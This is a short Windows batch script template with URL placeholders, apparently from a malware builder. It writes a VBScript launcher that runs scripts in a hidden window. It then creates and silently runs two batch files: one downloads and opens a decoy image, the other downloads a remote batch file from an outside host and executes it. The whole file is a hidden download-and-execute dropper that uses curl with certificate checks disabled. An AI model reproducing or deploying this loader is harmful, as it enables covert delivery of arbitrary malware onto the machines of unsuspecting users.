@echo off
echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript. Arguments^(0^) ^& """", 0, False > "%tmp%/inv.vbs"
(echo if not exist "%tmp%/front.jpg" ^(curl -k "{{picUrl}}" -o "%tmp%/front.jpg" ^) & echo "%tmp%/front.jpg") > "%tmp%/settings.bat"
(echo curl -k "{{batUrl}}" -o "%tmp%/c.bat" & echo call "%tmp%/c.bat") > "%tmp%/b.bat"
wscript.exe "%tmp%/inv.vbs" "%tmp%/settings.bat"
wscript.exe "%tmp%/inv.vbs" "%tmp%/b.bat"